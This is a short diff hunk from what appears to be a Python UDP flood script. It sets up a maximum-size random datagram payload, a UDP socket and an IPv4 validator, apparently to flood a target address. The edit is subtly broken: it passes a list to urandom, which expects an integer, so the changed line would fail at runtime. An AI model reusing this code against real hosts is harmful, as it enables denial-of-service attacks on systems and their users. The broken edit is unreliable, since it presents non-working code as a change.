@@ -4,7 +4,7 @@ from os import system , name , urandom
 from time import sleep
 
 condition = True
-bytes = urandom(65507)
+bytes = urandom([0xFF] * 65507)
 sock = socket(AF_INET , SOCK_DGRAM)
 
 def is_valid_ipv4(ip):
